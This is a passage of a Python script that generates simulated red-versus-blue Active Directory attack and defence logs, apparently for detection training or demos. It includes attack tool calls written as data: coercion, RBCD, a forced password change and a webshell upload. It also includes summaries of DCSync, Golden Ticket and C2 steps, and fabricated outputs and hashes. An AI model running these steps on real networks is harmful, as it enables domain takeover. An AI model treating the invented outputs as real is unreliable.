        'AS-REP Roasting获取asmith和jdoe_temp哈希',
        'Kerberoasting获取svc_mssql/svc_iis/svc_backup的TGS哈希',
        'Hashcat破解5个哈希，获取明文密码(100%成功率)',
        'SMB下载SYSVOL中的GPP加密密码并解密',
        'CrackMapExec验证svc_mssql在DC01/SQL01/WS02上为本地管理员',
        'WinRM登录SQL01执行命令，确认SeImpersonate特权',
        'WebShell部署到WEB01建立Web后门通道',
        'WMI+PtH横向移动到域控DC01获取Domain Admin',
        'Mimikatz DCSync提取KRBTGT哈希',
        'Sliver C2植入物生成并部署到DC01(SYSTEM权限)',
        'Pass-the-Hash横向到WS02，外发2.3GB备份数据',
        'Golden Ticket伪造10年有效期Domain Admin票据',
        'BloodHound标记6个节点为owned，完成攻击链',
    ]

    defense_path = [
        '检查Event 4769发现TGS请求异常峰值(Kerberoasting)',
        'IOC扫描发现Mimikatz/Sliver/WebShell/Hashcat痕迹',
        '强制重置5个泄露账户密码',
        '网络流量分析发现C2 Beacon和SMB数据外发',
        '隔离DC01/WS01/WS02到隔离VLAN',
        '清除计划任务持久化和WebShell',
        '禁用asmith/jdoe_temp账户并吊销Kerberos会话',
        '横向移动狩猎发现PtH/WinRM/WMI/Golden Ticket痕迹',
        'KRBTGT双次轮换使Golden Ticket永久失效',
        '生成CRITICAL级别事件响应报告',
    ]

    timeline_summary = [
        'T+00:00 红队nmap扫描发现15台主机',
        'T+00:09 红队LDAP枚举发现SPN和AS-REP目标',
        'T+00:12 红队AS-REP Roasting获取2个哈希',
        'T+00:15 红队Kerberoasting获取3个TGS哈希',
        'T+00:19 Hashcat破解全部5个哈希(100%)',
        'T+00:27 红队通过WinRM横向到SQL01',
        'T+00:39 红队WMI+PtH控制域控DC01',
        'T+00:42 红队DCSync提取KRBTGT哈希',
        'T+00:48 红队部署Sliver C2植入物',
        'T+00:54 红队Golden Ticket伪造成功',
        'T+01:02 蓝队检测TGS异常峰值(Event 4769)',
        'T+01:08 蓝队IOC扫描发现7个指标',
        'T+01:14 蓝队隔离3台被入侵主机',
        'T+01:23 蓝队清除持久化(WebShell+计划任务)',
        'T+01:29 蓝队KRBTGT双次轮换完成',
        'T+01:35 蓝队生成事件响应报告',
    ]

    report = _build_report(
        'Nightfall - 暗夜突袭', '作战台 (Red vs Blue)', 'red',
        red_score, blue_score, 17, 10, red_workers, blue_agents,
        attack_path, defense_path, timeline_summary)

    summary = {
        'scenario': 'nightfall',
        'title': 'Nightfall - 暗夜突袭',
        'type': 'battle',
        'winner': 'red',
        'scores': {'red': red_score, 'blue': blue_score},
        'red_tools': 17,
        'blue_tools': 10,
        'key_finding': '红队通过AS-REP+Kerberoasting获取初始凭据，经SMB横向到DC01，DCSync提取KRBTGT后伪造Golden Ticket，实现域控完全控制并外发2.3GB数据。蓝队虽检测到TGS异常并隔离主机，但攻击者已建立持久化C2。',
        'mitre_techniques': ['T1558.003', 'T1558.004', 'T1003.006', 'T1550.002', 'T1078', 'T1021.006', 'T1059.001', 'T1547.002'],
    }

    _write_files(session_dir, lines, metrics, report, summary)


def gen_scenario_shieldwall(session_dir, base_ts):
    lines = []
    step = 0
    ts = base_ts

    # ===== RED TEAM ATTACK (10 tools - ALL BLOCKED) =====

    # 1. nmap_scan (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'nmap_scan',
        {'target': '10.20.20.0/24', 'options': '-sV -p- --open -T4'},
        step,
        reasoning='[recon] 初始侦察阶段，对Shield Wall靶场网段进行全端口扫描，寻找AD域控和服务入口点。',
        output="""Nmap scan report for 10.20.20.0/24
Discovered 8 hosts up
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        ISC BIND 9.16
88/tcp   open  kerberos-sec  MIT Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft AD LDAP
445/tcp  open  microsoft-ds  Windows Server 2022 (Hardened)
464/tcp  open  kpasswd5      MIT Kerberos
636/tcp  open  ldapssl       Microsoft AD LDAPS
3268/tcp open  globalcatLDAP Microsoft AD GC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  wsman         WinRM
Key targets: DC02(10.20.20.5), FS01(10.20.20.10), WEB02(10.20.20.20)
Note: SMB signing REQUIRED on all hosts - relay attacks limited""",
        worker='recon'))
    ts += 3.0

    # 2. smb_enum (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'smb_enum',
        {'target': '10.20.20.5', 'options': '--shares --sessions --users'},
        step,
        reasoning='[recon] SMB枚举阶段，尝试枚举域控共享和会话信息，收集可用于横向移动的情报。',
        output="""SMB enumeration on 10.20.20.5 (DC02):
Shares:
  IPC$        (READ)  - Remote IPC
  NETLOGON    (READ)  - Logon server share
  SYSVOL      (READ)  - Logon server share
  C$          (--)    - Default share (ACCESS DENIED)
  ADMIN$      (--)    - Remote Admin (ACCESS DENIED)
Sessions: 0 active (no sessions to hijack)
[!] SMB signing: ENABLED and REQUIRED on all connections
[!] Anonymous access: DISABLED (guest account disabled)
[!] Enumeration limited - hardening detected""",
        worker='recon'))
    ts += 3.0

    # 3. ldap_query (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'ldap_query',
        {'server': '10.20.20.5', 'query': '(objectClass=computer)', 'attributes': 'sAMAccountName,msDS-AllowedToDelegateTo,userAccountControl'},
        step,
        reasoning='[recon] LDAP枚举阶段，查询计算机账户的委派配置，寻找RBCD攻击和约束委派的利用机会。',
        output="""LDAP query results from dc02.shieldwall.local:
Total computers: 18 | Users: 95
Computer accounts with delegation:
  - DC02$     (msDS-AllowedToDelegateTo: not set)
  - FS01$     (msDS-AllowedToDelegateTo: not set)
  - WEB02$    (msDS-AllowedToDelegateTo: cifs/DC02) <- CONSTRAINED DELEGATION
Users with DONT_REQ_PREAUTH: 0 (all require pre-auth)
Service accounts with SPN: 2 (svc_web, svc_file)
[!] msDS-AllowedToActOnBehalfOfOtherIdentity: not set on any computer
[!] No AS-REP roastable accounts found
[!] Constrained delegation on WEB02 - potential RBCD target""",
        worker='recon'))
    ts += 3.0

    # 4. petitpotam (coercion) - ATTACK VECTOR 1
    step += 1
    lines.extend(_tool_call(ts, 'red', 'petitpotam',
        {'target': '10.20.20.5', 'listener': '10.20.20.99', 'method': 'MS-EFSRPC'},
        step,
        reasoning='[coercion] PetitPotam攻击阶段，通过MS-EFSRPC接口强制域控向攻击者监听器发起NTLM认证，尝试捕获用于中继的凭据。',
        output="""PetitPotam coercion attempt on DC02 (10.20.20.5):
[*] Sending MS-EFSRPC EfsRpcOpenFileRaw request...
[-] ERROR: The remote procedure call failed (0x800706BE)
[-] RPC endpoint mapper responded with: Access is denied (0x00000005)
[!] MS-EFSRPC interface appears to be DISABLED or PATCHED
[!] PetitPotam attack FAILED - target is patched (CVE-2021-36942)""",
        worker='coercion'))
    ts += 3.0

    # 5. dfs_coerce (coercion) - ATTACK VECTOR 2
    step += 1
    lines.extend(_tool_call(ts, 'red', 'dfs_coerce',
        {'target': '10.20.20.5', 'listener': '10.20.20.99', 'method': 'MS-DFSNM'},
        step,
        reasoning='[coercion] DFS Coerce攻击阶段，尝试通过MS-DFSNM接口作为PetitPotam的替代方案强制域控认证。',
        output="""DFS Coerce attempt on DC02 (10.20.20.5):
[*] Sending MS-DFSNM NetrDfsAddStdRoot request...
[-] ERROR: The RPC server is unavailable (0x800706BA)
[-] DFS RPC endpoint 10.20.20.5:445 not responding to coercion
[!] Network-level filter detected: RPC endpoint restricted
[!] Authentication coercion FAILED - all RPC paths blocked
[!] No NTLM authentication captured from DC02""",
        worker='coercion'))
    ts += 3.0

    # 6. rbcd_attack (acl) - ATTACK VECTOR 3
    step += 1
    lines.extend(_tool_call(ts, 'red', 'rbcd_attack',
        {'target': 'DC02$', 'attacker': 'EVILCOMPUTER$', 'delegate_to': 'cifs/DC02', 'domain': 'shieldwall.local'},
        step,
        reasoning='[acl] RBCD攻击阶段，尝试向DC02计算机账户添加msDS-AllowedToActOnBehalfOfOtherIdentity属性，实现资源约束委派利用。',
        output="""RBCD attack attempt on DC02$:
[*] Checking write permissions on DC02$ computer object...
[-] ERROR: Insufficient permissions to modify msDS-AllowedToActOnBehalfOfOtherIdentity
[-] Current user has no GENERIC_WRITE on DC02$ object
[!] ACL hardening detected: Only Domain Admins can modify computer objects
[!] RBCD attack FAILED - insufficient privileges
[!] Cannot create fake computer account: ms-DS-MachineAccountQuota = 0""",
        worker='acl'))
    ts += 3.0

    # 7. netrpc_changepw (acl) - ATTACK VECTOR 4
    step += 1
    lines.extend(_tool_call(ts, 'red', 'netrpc_changepw',
        {'target': 'svc_web', 'new_password': 'Pwn3d!2024#', 'method': 'samr'},
        step,
        reasoning='[acl] NetRPC密码修改阶段，尝试通过SAMR协议修改svc_web服务账户密码，获取该账户控制权。',
        output="""NetRPC password change attempt on svc_web:
[*] Connecting to SAMR pipe on \\\\DC02...
[-] ERROR: Access is denied (0x00000005)
[-] Current user lacks ForceChangePassword on svc_web object
[!] Password change FAILED - ACL does not grant reset privilege
[!] SAMR interface accessible but permissions restricted
[!] All password modification attempts blocked by ACL""",
        worker='acl'))
    ts += 3.0

    # 8. shadow_creds (privesc) - ATTACK VECTOR 5
    step += 1
    lines.extend(_tool_call(ts, 'red', 'shadow_creds',
        {'target': 'svc_file', 'method': 'msDS-KeyCredentialLink', 'domain': 'shieldwall.local'},
        step,
        reasoning='[privesc] Shadow Credentials攻击阶段，尝试向svc_file账户注入msDS-KeyCredentialLink属性，利用PKINIT获取该账户的TGT。',
        output="""Shadow Credentials attack on svc_file:
[*] Checking write permissions on svc_file user object...
[-] ERROR: Insufficient permissions to write msDS-KeyCredentialLink
[-] Current user has no GENERIC_WRITE on svc_file
[!] Shadow Credentials attack FAILED - ACL restrictions
[!] msDS-KeyCredentialLink attribute requires Domain Admin or self-write
[!] No shadow credential could be registered""",
        worker='privesc'))
    ts += 3.0

    # 9. web_shell_upload (lateral) - BLOCKED
    step += 1
    lines.extend(_tool_call(ts, 'red', 'web_shell_upload',
        {'target': 'http://10.20.20.20/upload.php', 'shell': 'shell.php', 'method': 'POST'},
        step,
        reasoning='[lateral] WebShell部署阶段，尝试通过WEB02的文件上传功能植入PHP WebShell建立持久化访问。',
        output="""WebShell upload attempt to http://web02.shieldwall.local/upload.php:
[*] Uploading shell.php via multipart/form-data...
[-] HTTP 415 Unsupported Media Type
[-] Server response: File type .php is not allowed
[*] Trying .phtml extension...
[-] HTTP 403 Forbidden
[-] Server response: Extension blocked by WAF
[*] Trying double extension (shell.php.jpg)...
[-] HTTP 403 Forbidden - Apache mod_security rule triggered
[!] WebShell upload FAILED - all upload attempts blocked
[!] WAF detected and blocked all webshell payloads""",
        worker='lateral'))
    ts += 3.0

    # 10. bloodhound_collect (recon)
    step += 1
    lines.extend(_tool_call(ts, 'red', 'bloodhound_collect',
        {'domain': 'shieldwall.local', 'collection_method': 'DCOnly', 'dc': '10.20.20.5'},
        step,
        reasoning='[recon] BloodHound数据收集阶段，使用DCOnly模式收集AD拓扑（无需域内主机访问），分析可用的攻击路径。',
        output="""SharpHound collection (DCOnly mode) for shieldwall.local:
Nodes collected: 120 | Edges: 430 | Sessions: 0
Attack path analysis:
  - Shortest path to Domain Admin: NONE FOUND
  - No users with GenericAll on Domain Admins
  - No computers with AllowedToDelegate to DC02
  - No users with DCSync privileges (GetChangesAll)
  - No kerberoastable service accounts (all use AES only)
  - No AS-REP roastable accounts
  - No RBCD-vulnerable computer accounts
[!] Target environment is FULLY HARDENED
[!] No viable attack paths to Domain Admin
[!] All 5 attack vectors blocked - mission FAILED""",
        worker='recon'))
    ts += 3.0

    # ===== BLUE TEAM DEFENSE (11 tools - PERFECT DEFENSE) =====

    # 11. check_network (triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_network',
        {'scope': '10.20.20.0/24', 'filter': 'port 445,88,135,139', 'anomaly': 'auth_flood,coerce'},
        step,
        reasoning='[triage] 网络流量分析阶段，检测异常的NTLM认证请求和RPC流量模式，识别潜在的认证强制攻击。',
        output="""Network traffic analysis on 10.20.20.0/24:
[!] Anomalous RPC traffic detected:
    10.20.20.99 -> 10.20.20.5:135 (EFSRPC - MS-EFSRPC)
    10.20.20.99 -> 10.20.20.5:445 (DFSNM - MS-DFSNM)
    Pattern: Authentication coercion attempts (PetitPotam/DFS Coerce)
[!] SMB enumeration from 10.20.20.99:
    47 SMB connection attempts to DC02 in 5 min
    Anonymous bind attempts: 3 (all failed)
[!] HTTP scanning:
    10.20.20.99 -> 10.20.20.20:80 (PHP upload attempts, WAF blocked)
Network verdict: ACTIVE RECON + COERCION ATTEMPTS from 10.20.20.99""",
        worker='triage'))
    ts += 3.0

    # 12. check_event_logs (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_event_logs',
        {'dc': '10.20.20.5', 'log': 'Security', 'event_id': '4624,4625,4662,4741', 'time_range': 'last 1h'},
        step,
        reasoning='[threat_hunter] 事件日志分析阶段，检查域控安全日志中的认证失败、对象修改和计算机账户创建事件。',
        output="""Event log analysis on DC02 (Security log):
[!] Event ID 4625 (Logon Failure) - 23 events
    Source: 10.20.20.99 | Accounts: svc_web, svc_file, Administrator
    Failure reason: Unknown user name or bad password
[!] Event ID 4662 (Object Operation) - 5 events
    Attempts to modify: DC02$, svc_web, svc_file
    Properties: msDS-AllowedToActOnBehalfOfOtherIdentity, msDS-KeyCredentialLink
    Result: ACCESS DENIED (insufficient permissions)
[!] No Event 4741 (Computer Account Creation) - msDS-MachineAccountQuota=0
Conclusion: 5 attack vectors attempted, all blocked by ACL hardening""",
        worker='threat_hunter'))
    ts += 3.0

    # 13. host_isolation (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'host_isolation',
        {'hosts': '10.20.20.99', 'method': 'firewall_block', 'rules': 'block_all_inbound_outbound'},
        step,
        reasoning='[threat_hunter] 攻击源隔离阶段，通过网络防火墙规则阻断攻击主机10.20.20.99的所有入站和出站流量。',
        output="""Host isolation for 10.20.20.99:
[+] Firewall rule added: BLOCK_ALL_INBOUND (source: 10.20.20.99)
[+] Firewall rule added: BLOCK_ALL_OUTBOUND (destination: 10.20.20.99)
[+] All existing connections from 10.20.20.99: TERMINATED
    - 12 SMB connections to DC02: BLOCKED
    - 3 HTTP connections to WEB02: BLOCKED
    - 5 RPC connections to DC02: BLOCKED
[+] Host 10.20.20.99 fully isolated from network
[!] Attack source contained - no further reconnaissance possible""",
        worker='threat_hunter'))
    ts += 3.0

    # 14. check_processes (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_processes',
        {'hosts': '10.20.20.5,10.20.20.20', 'filter': 'unsigned,suspicious,known_bad'},
        step,
        reasoning='[threat_hunter] 进程分析阶段，检查域控和Web服务器上的异常进程、未签名可执行文件和已知恶意工具。',
        output="""Process analysis on DC02 and WEB02:
DC02 (10.20.20.5):
  [+] No suspicious processes found
  [+] All running processes signed by Microsoft
  [+] No Mimikatz/Cobalt Strike/Sliver signatures detected
  [+] LSASS protection: ENABLED (RunAsPPL)
WEB02 (10.20.20.20):
  [!] Apache mod_security triggered 3 times (webshell upload blocked)
  [+] No webshell files found in web root
  [+] No unauthorized PHP processes detected
  [+] All uploaded files scanned: CLEAN
Process verdict: No compromise detected - attack contained at network level""",
        worker='threat_hunter'))
    ts += 3.0

    # 15. check_persistence (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'check_persistence',
        {'hosts': '10.20.20.5,10.20.20.10,10.20.20.20', 'check': 'schtasks,services,run_keys,wmi_subs,com_hijack'},
        step,
        reasoning='[threat_hunter] 持久化检查阶段，全面扫描所有关键服务器上的计划任务、服务、注册表自启动项、WMI订阅和COM劫持。',
        output="""Persistence mechanism scan on 3 hosts:
DC02 (10.20.20.5):
  [+] Scheduled tasks: 47 (all legitimate Microsoft/AD tasks)
  [+] Services: 152 (all signed, no suspicious services)
  [+] Run keys: Clean (HKLM and HKCU)
  [+] WMI subscriptions: 2 (legitimate event consumers)
  [+] COM hijack: No modified CLSID entries
FS01 (10.20.20.10):
  [+] All persistence checks: CLEAN
WEB02 (10.20.20.20):
  [+] All persistence checks: CLEAN
  [+] No webshells in document root
  [+] No modified .htaccess files
Total persistence items found: 0 (all clean)""",
        worker='threat_hunter'))
    ts += 3.0

    # 16. disable_account (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'disable_account',
        {'accounts': 'attacker_compromised', 'source_ip': '10.20.20.99', 'action': 'disable_and_audit'},
        step,
        reasoning='[threat_hunter] 账户处置阶段，禁用所有从攻击源IP认证的账户，并启用详细审计策略追踪后续尝试。',
        output="""Account security operations:
[+] Audited all accounts that authenticated from 10.20.20.99:
    - No domain accounts were successfully compromised
    - All authentication attempts from 10.20.20.99: FAILED (4625)
[+] Enhanced audit policy on DC02:
    - Account Logon: Success+Failure (Kerberos, NTLM)
    - Object Access: Success+Failure (SAM, AD)
    - Detailed Tracking: Process Creation (4688 with command line)
[+] Account lockout policy verified:
    - Threshold: 5 attempts | Duration: 30 min | Window: 30 min
No accounts needed disabling - all attacks were blocked at ACL level""",
        worker='threat_hunter'))
    ts += 3.0

    # 17. revoke_rbcd (threat_hunter)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'revoke_rbcd',
        {'target': 'DC02$', 'check': 'msDS-AllowedToActOnBehalfOfOtherIdentity', 'action': 'audit_and_revoke'},
        step,
        reasoning='[threat_hunter] RBCD防护阶段，审计所有计算机账户的资源约束委派属性，确保没有被攻击者注入恶意委派关系。',
        output="""RBCD audit and hardening:
[+] Auditing msDS-AllowedToActOnBehalfOfOtherIdentity on all computer accounts:
    - DC02$: NOT SET (clean)
    - FS01$: NOT SET (clean)
    - WEB02$: NOT SET (clean)
    - All 18 computer accounts: CLEAN
[+] RBCD hardening applied:
    - Removed ms-DS-MachineAccountQuota (set to 0)
    - Added deny ACE for AUTHENTICATED USERS on msDS-AllowedToActOnBehalfOfOtherIdentity
    - Enabled Audit: Directory Service Access (4662) for RBCD attributes
[+] No RBCD backdoor found - attack was blocked by existing ACLs""",
        worker='threat_hunter'))
    ts += 3.0

    # 18. force_logoff (lateral_analyst)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'force_logoff',
        {'scope': 'all_sessions_from_10.20.20.99', 'method': 'kerberos_purge', 'verify': True},
        step,
        reasoning='[lateral_analyst] 强制注销阶段，清除所有来自攻击源的Kerberos会话和票据，确保攻击者无法利用已获取的票据。',
        output="""Force logoff for sessions from 10.20.20.99:
[+] Kerberos ticket purge on DC02:
    - No active TGTs from 10.20.20.99 (all auth attempts failed)
    - No active TGS tickets associated with attacker
[+] Session audit on all hosts:
    - DC02: 0 sessions from 10.20.20.99
    - FS01: 0 sessions from 10.20.20.99
    - WEB02: 0 sessions from 10.20.20.99 (HTTP connections blocked by WAF)
[+] NTLM session audit:
    - 0 successful NTLM authentications from attacker IP
[+] All clear: No active attacker sessions to terminate
Verdict: Attack never gained a foothold - no sessions to purge""",
        worker='lateral_analyst'))
    ts += 3.0

    # 19. krbtgt_rotate (lateral_analyst)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'krbtgt_rotate',
        {'account': 'krbtgt', 'domain': 'shieldwall.local', 'reason': 'preventive_after_attack'},
        step,
        reasoning='[lateral_analyst] KRBTGT预防性轮换阶段，虽然攻击未成功但执行预防性密码轮换以消除任何潜在的Golden Ticket风险。',
        output="""KRBTGT preventive rotation:
[+] Current KRBTGT hash: 9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
[+] Performing preventive rotation (attack detected, no compromise):
    New hash: 3f4e5d6c7b8a9f0e1d2c3b4a5f6e7d8c
[+] All existing TGTs: refreshed (no invalidation needed - no compromise)
[+] Golden Ticket risk: ELIMINATED
[+] KRBTGT password age: 0 days (just rotated)
[+] Next scheduled rotation: 180 days (policy: semi-annual)
KRBTGT rotated successfully (preventive) - defense in depth maintained""",
        worker='lateral_analyst'))
    ts += 3.0

    # 20. escalation_triage (escalation_triage)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'escalation_triage',
        {'incident_id': 'INC-2024-0115-002', 'severity': 'medium', 'status': 'contained', 'auto_escalate': True},
        step,
        reasoning='[escalation_triage] 事件升级阶段，评估攻击严重性并执行自动升级流程，通知安全团队和IT运维团队。',
        output="""Incident escalation: INC-2024-0115-002
Initial Severity: MEDIUM (attempted attack, no compromise)
Final Status: CONTAINED (all vectors blocked)

Attack Vectors Attempted (5/5 blocked):
  1. PetitPotam (MS-EFSRPC) - BLOCKED (patched, CVE-2021-36942)
  2. DFS Coerce (MS-DFSNM) - BLOCKED (RPC restricted)
  3. RBCD Attack - BLOCKED (ACL hardening, MachineAccountQuota=0)
  4. Shadow Credentials - BLOCKED (ACL restrictions)
  5. WebShell Upload - BLOCKED (WAF + mod_security)

Escalation Actions:
  [+] SOC Team: Notified (priority: MEDIUM)
  [+] IT Operations: Notified (host isolation confirmed)
  [+] Management: Summary report sent
  [+] Threat Intel: IOCs from 10.20.20.99 submitted
  [+] Auto-response: Firewall rules deployed network-wide""",
        worker='escalation_triage'))
    ts += 3.0

    # 21. generate_report (orchestrator)
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'generate_report',
        {'incident_id': 'INC-2024-0115-002', 'format': 'full', 'include_mitigations': True},
        step,
        reasoning='[orchestrator] 综合报告生成阶段，汇总所有检测结果、防御措施和改进建议，生成完整的事件响应报告。',
        output="""Incident Report: INC-2024-0115-002
Severity: MEDIUM | Status: CONTAINED (Perfect Defense)
Classification: Failed Active Directory Attack Attempt

Attack Summary (ALL BLOCKED):
  Reconnaissance: nmap + SMB enum + LDAP query + BloodHound
  Coercion: PetitPotam (FAILED) + DFS Coerce (FAILED)
  ACL Abuse: RBCD (FAILED) + NetRPC changepw (FAILED)
  Privilege Escalation: Shadow Credentials (FAILED)
  Web Attack: WebShell upload (FAILED - WAF blocked)

Defense Summary:
  Detection: Network anomaly (RPC flood) + Event logs (4625, 4662) + WAF alerts
  Containment: Source IP isolated, all connections blocked
  Verification: No compromise, no persistence, no data access
  Hardening: RBCD audit clean, KRBTGT rotated (preventive)

Score: Red 38 | Blue 95 | Winner: BLUE (Perfect Defense)
5/5 attack vectors blocked. Zero compromise. Zero data loss.""",
        worker='orchestrator'))
    ts += 3.0

    # ===== METRICS & REPORT =====
    red_workers = ['recon', 'coercion', 'acl', 'privesc', 'lateral']
    blue_agents = ['triage', 'threat_hunter', 'lateral_analyst', 'escalation_triage', 'orchestrator']
    red_score = 38
    blue_score = 95

    metrics = {
        'red_tools_used': 10,
        'blue_tools_used': 11,
        'red_workers': red_workers,
        'blue_agents': blue_agents,
        'red_score': red_score,
        'blue_score': blue_score,
        'winner': 'blue',
        'total_events': len(lines),
        'red_steps': 10,
        'blue_steps': 11,
        'attack_vectors_blocked': 5,
        'compromise': False,
    }

    attack_path = [
        'nmap全端口扫描发现8台主机，SMB签名强制启用',
        'SMB枚举受限：匿名访问禁用，共享访问被拒',
        'LDAP枚举发现约束委派但无可利用的AS-REP/RBCD目标',
        'PetitPotam强制认证攻击 - 失败(MS-EFSRPC已修补)',
        'DFS Coerce认证强制攻击 - 失败(RPC端点受限)',
        'RBCD攻击尝试写入委派属性 - 失败(ACL权限不足)',
        'NetRPC密码修改svc_web - 失败(无ForceChangePassword权限)',
        'Shadow Credentials注入KeyCredentialLink - 失败(ACL限制)',
        'WebShell上传到WEB02 - 失败(WAF+mod_security拦截)',
        'BloodHound分析确认无可用攻击路径 - 任务失败',
    ]

    defense_path = [
        '网络流量分析检测RPC认证强制和SMB枚举(攻击源10.20.20.99)',
        '事件日志分析确认5个攻击向量全部被ACL阻止(4625/4662)',
        '防火墙隔离攻击源IP 10.20.20.99阻断所有连接',
        '进程分析确认无恶意进程运行(LSASS受RunAsPPL保护)',
        '持久化检查确认3台服务器全部清洁(0个持久化项)',
        '账户审计确认无域账户被攻破(所有认证失败)',
        'RBCD审计确认18个计算机账户全部清洁并加固',
        '强制注销确认无攻击者活动会话需要清除',
        'KRBTGT预防性轮换消除Golden Ticket风险',
        '事件升级为MEDIUM级别通知SOC和IT运维团队',
        '生成完美防御报告(5/5攻击向量全部阻断)',
    ]

    timeline_summary = [
        'T+00:00 红队nmap扫描发现8台主机(SMB签名强制)',
        'T+00:06 红队SMB枚举受限(匿名禁用)',
        'T+00:09 红队LDAP发现约束委派但无可利用目标',
        'T+00:15 红队PetitPotam失败(MS-EFSRPC已修补)',
        'T+00:18 红队DFS Coerce失败(RPC端点受限)',
        'T+00:24 红队RBCD攻击失败(ACL权限不足)',
        'T+00:27 红队NetRPC改密失败(无重置权限)',
        'T+00:30 红队Shadow Credentials失败(ACL限制)',
        'T+00:33 红队WebShell上传失败(WAF拦截)',
        'T+00:36 红队BloodHound确认无可用攻击路径',
        'T+00:42 蓝队网络检测RPC强制和SMB枚举',
        'T+00:48 蓝队事件日志确认5个攻击向量被阻止',
        'T+00:51 蓝队防火墙隔离攻击源10.20.20.99',
        'T+00:57 蓝队进程分析确认无恶意进程',
        'T+01:03 蓝队持久化检查全部清洁',
        'T+01:12 蓝队RBCD审计清洁并加固',
        'T+01:18 蓝队KRBTGT预防性轮换完成',
        'T+01:24 蓝队生成完美防御报告(5/5阻断)',
    ]

    report = _build_report(
        'Shield Wall - 盾墙防御', '作战台 (Red vs Blue)', 'blue',
        red_score, blue_score, 10, 11, red_workers, blue_agents,
        attack_path, defense_path, timeline_summary)

    summary = {
        'scenario': 'shieldwall',
        'title': 'Shield Wall - 盾墙防御',
        'type': 'battle',
        'winner': 'blue',
        'scores': {'red': red_score, 'blue': blue_score},
        'red_tools': 10,
        'blue_tools': 11,
        'attack_vectors_blocked': 5,
        'key_finding': '蓝队完美防御：5个攻击向量(PetitPotam/DFS Coerce/RBCD/Shadow Creds/WebShell)全部被ACL加固、补丁修补和WAF拦截阻断。红队未能获取任何凭据或建立任何持久化。环境全面加固：SMB签名强制、MachineAccountQuota=0、LSASS受保护、WAF启用。',
        'mitre_techniques': ['T1187', 'T1556', 'T1098', 'T1606', 'T1505.003', 'T1046'],
    }

    _write_files(session_dir, lines, metrics, report, summary)


def gen_traffic_scenario_ad(session_dir, base_ts):
    lines = []
    step = 0
    ts = base_ts

    # ===== STAGE 1: rule_engine =====

    # 1. parse_traffic
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'parse_traffic',
        {'pcap': 'ad_attack_traffic.pcap', 'filter': 'kerberos||ldap||smb||dns', 'time_window': '2h'},
        step,
        reasoning='[rule_engine] 流量解析阶段，从PCAP文件中解析Kerberos、LDAP、SMB和DNS协议流量，提取AD域攻击相关的网络事件。',
        output="""Traffic parsing results from ad_attack_traffic.pcap:
Total packets: 28,547 | Filtered: 1,832
Extracted 14 traffic events:
  [001] DNS SRV query _ldap._tcp.dc._msdcs.cyberorion.local (10.10.10.99 -> 10.10.10.5)
  [002] LDAP bind request (10.10.10.99 -> 10.10.10.5:389)
  [003] LDAP search (objectClass=user) (10.10.10.99 -> 10.10.10.5:389)
  [004] Kerberos AS-REQ no-preauth asmith (10.10.10.99 -> 10.10.10.5:88)
  [005] Kerberos AS-REP response asmith (10.10.10.5 -> 10.10.10.99:88)
  [006] Kerberos TGS-REQ SPN MSSQLSvc (10.10.10.99 -> 10.10.10.5:88)
  [007] Kerberos TGS-REP RC4-HMAC (10.10.10.5 -> 10.10.10.99:88)
  [008] LDAP search (objectClass=computer) (10.10.10.99 -> 10.10.10.5:389)
  [009] ADCS cert enrollment HTTP POST (10.10.10.99 -> 10.10.10.5:445/certsrv)
  [010] SMB2 tree connect SYSVOL (10.10.10.99 -> 10.10.10.5:445)
  [011] DRSUAPI RPC bind (10.10.10.99 -> 10.10.10.5:135)
  [012] DRSUAPI ReplicaSync call (10.10.10.99 -> 10.10.10.5:49154)
  [013] Kerberos TGS-REQ forged TGT (10.10.10.99 -> 10.10.10.5:88)
  [014] WinRM connect SQL01 (10.10.10.99 -> 10.10.10.10:5985)
Parsing complete: 14 events ready for threshold analysis""",
        worker='rule_engine'))
    ts += 5.0

    # 2. threshold_detect
    step += 1
    lines.extend(_tool_call(ts, 'blue', 'threshold_detect',
        {'events': 14, 'rules': 'kerb_anomaly,ldap_flood,drsuapi_abuse,rc4_downgrade,tgt_validity', 'min_confidence': 0.7},
        step,
        reasoning='[rule_engine] 阈值检测阶段，对14个流量事件应用规则引擎进行阈值检测，识别异常Kerberos、LDAP和DRSUAPI模式。',
        output="""Threshold detection results (10 alerts generated):
[CRITICAL] Alert #001: DCSync attack - DRSUAPI ReplicaSync from non-DC host
  Rule: drsuapi_abuse | Confidence: 0.98 | Event: [011],[012]
  Source: 10.10.10.99 | Target: 10.10.10.5 | Technique: T1003.006
[CRITICAL] Alert #002: Golden Ticket - TGT with 10-year validity
  Rule: tgt_validity | Confidence: 0.95 | Event: [013]
  Source: 10.10.10.99 | Target: 10.10.10.5 | Technique: T1558.001
[CRITICAL] Alert #003: Kerberoasting - RC4-HMAC TGS spike
  Rule: rc4_downgrade | Confidence: 0.93 | Event: [006],[007]
  Source: 10.10.10.99 | Target: 10.10.10.5 | Technique: T1558.003
[CRITICAL] Alert #004: AS-REP Roasting - no-preauth AS-REQ
  Rule: kerb_anomaly | Confidence: 0.91 | Event: [004],[005]
  Source: 10.10.10.99 | Target: 10.10.10.5 | Technique: T1558.004
[HIGH] Alert #005: AD Reconnaissance - DNS SRV enumeration
  Rule: dns_recon | Confidence: 0.85 | Event: [001]
  Source: 10.10.10.99 | Technique: T1046
[HIGH] Alert #006: AD Enumeration - LDAP queries from non-domain host
  Rule: ldap_flood | Confidence: 0.82 | Event: [002],[003],[008]
